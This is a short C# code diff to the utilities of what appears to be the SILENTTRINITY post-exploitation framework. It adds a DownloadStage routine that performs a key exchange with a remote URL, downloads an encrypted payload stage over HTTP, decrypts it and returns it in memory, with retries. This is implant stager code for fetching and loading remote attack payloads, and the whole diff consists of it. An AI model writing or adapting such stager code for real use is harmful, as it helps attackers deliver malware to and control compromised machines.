@@ -1,4 +1,6 @@
-﻿using System.IO.Compression;
+﻿using System;
+using System.IO;
+using System.IO.Compression;
 
 namespace SILENTTRINITY.Utilities
 {
@@ -30,5 +32,16 @@ namespace SILENTTRINITY.Utilities
             return default;
         }
 
+        public static MemoryStream DownloadStage(Uri URL, int sleep = 5, int retries = 6)
+        {
+            return Retry.Do(() => GetStage(URL), TimeSpan.FromSeconds(sleep), retries);
+        }
+
+        static MemoryStream GetStage(Uri uri)
+        {
+            var key = Crypto.Base.KeyExchange(uri);
+            var stage = Crypto.Base.Decrypt(key, Http.Get(uri));
+            return new MemoryStream(stage);
+        }
     }
 }
